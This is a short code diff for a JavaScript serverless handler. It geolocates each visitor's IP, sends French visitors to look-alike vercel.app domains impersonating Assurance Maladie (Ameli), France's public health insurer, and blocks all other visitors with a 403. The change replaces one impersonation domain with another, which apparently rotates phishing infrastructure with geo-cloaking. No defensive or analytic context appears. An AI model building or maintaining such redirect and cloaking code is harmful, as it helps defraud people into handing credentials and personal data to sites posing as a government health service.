@@ -28,7 +28,7 @@ export default async function handler(req, res) {
     const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
     const geoData = await geoResponse.json();
     if (geoData.status === 'success' && geoData.countryCode === 'FR') {
-      res.redirect(301, 'https://assurancemaladie-ameli-espace-caiss.vercel.app/');
+      res.redirect(301, 'https://mon-compte-caisse-assurancemaladie.vercel.app/');
     } else {
       res.status(403).send('Access restricted to France-based IPs only.');
     }
